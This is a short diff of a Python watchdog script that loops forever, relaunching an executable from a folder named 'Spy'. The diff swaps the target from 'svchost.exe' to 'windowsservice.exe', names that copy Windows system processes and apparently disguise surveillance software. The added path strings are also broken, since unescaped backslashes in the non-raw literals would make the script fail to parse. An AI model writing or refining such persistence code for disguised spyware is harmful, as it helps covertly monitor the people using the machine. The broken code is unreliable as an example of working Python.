@@ -1,13 +1,11 @@
+
 import os
 import time
 from datetime import datetime
-
-EXE_PATH = r"c:\Users\Keer\Desktop\Spy\svchost.exe"
-
+import ctypes
 while True:
-    try:
-        if os.path.exists(EXE_PATH):
-            os.system(f'"{EXE_PATH}"')
-    except Exception as e:
-        pass
+    if not os.path.exists("C:\Users\Keer\Desktop\Spy\windowsservice.exe"):
+        time.sleep(60)
+        continue
+    os.system(f'start "" "C:\Users\Keer\Desktop\Spy\windowsservice.exe"')
     time.sleep(300)
